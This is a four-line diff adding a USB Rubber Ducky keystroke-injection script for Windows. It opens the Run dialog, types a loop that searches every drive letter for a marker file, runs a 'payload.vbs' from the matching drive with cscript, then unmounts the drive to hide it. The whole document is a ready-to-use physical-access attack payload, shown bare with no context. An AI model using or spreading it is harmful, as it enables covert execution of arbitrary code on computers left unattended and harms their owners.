@@ -1,0 +1,4 @@
+GUI r
+DELAY 1000
+STRING for %s in (a: b: c: d: e: f: g: h: i: j: k: l: m: n: o: p: q: r: s: t: u: v: w: x: y: z:) do (if exist %s/thisistheducky (cd /d %s/ && cscript %s\payload.vbs && mountvol %s /p && exit))
+ENTER
